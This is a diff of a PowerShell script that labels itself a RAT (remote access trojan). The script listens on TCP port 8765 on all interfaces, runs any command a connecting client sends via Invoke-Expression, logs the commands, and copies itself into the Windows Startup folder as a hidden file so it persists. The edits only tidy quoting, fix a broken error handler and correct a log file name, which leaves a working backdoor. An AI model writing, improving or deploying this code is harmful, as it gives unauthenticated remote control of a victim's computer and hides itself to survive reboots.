@@ -1,9 +1,10 @@
 $listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any, 8765)
 $listener.Start()
-'RAT started on 0.0.0.0:8765' | Out-File 'C:\Temp\rat_log.txt'
+"RAT started on 0.0.0.0:8765" | Out-File "C:\Temp\rat_log.txt"
+
 while ($true) {
     $client = $listener.AcceptTcpClient()
-    'Client connected: ' + $client.Client.RemoteEndPoint | Out-File 'C:\Temp\ratlog.txt' -Append
+    "Client connected: $($client.Client.RemoteEndPoint)" | Out-File "C:\Temp\rat_log.txt" -Append
     $stream = $client.GetStream()
     $reader = [System.IO.StreamReader]::new($stream)
     $writer = [System.IO.StreamWriter]::new($stream)
@@ -13,18 +14,19 @@ while ($true) {
         if ($cmd) {
             try {
                 $output = Invoke-Expression $cmd 2>&1 | Out-String
-                if (-not $output) { $output = 'Done' }
+                if (-not $output) { $output = "Done" }
             } catch {
-                $output = 'Error: ' + $
+                $output = "Error: " + $_.Exception.Message
             }
             $writer.WriteLine($output)
-            "$cmd -> $output" | Out-File 'C:\Temp\rat_log.txt' -Append
+            "$cmd -> $output" | Out-File "C:\Temp\rat_log.txt" -Append
         }
     }
     $client.Close()
 }
 $listener.Stop()
-$startup = $env:APPDATA + '\Microsoft\Windows\Start Menu\Programs\Startup\runrat.ps1'
+
+$startup = $env:APPDATA + "\Microsoft\Windows\Start Menu\Programs\Startup\runrat.ps1"
 if (-not (Test-Path $startup)) {
     $MyInvocation.MyCommand.Definition | Out-File $startup
     attrib +h $startup
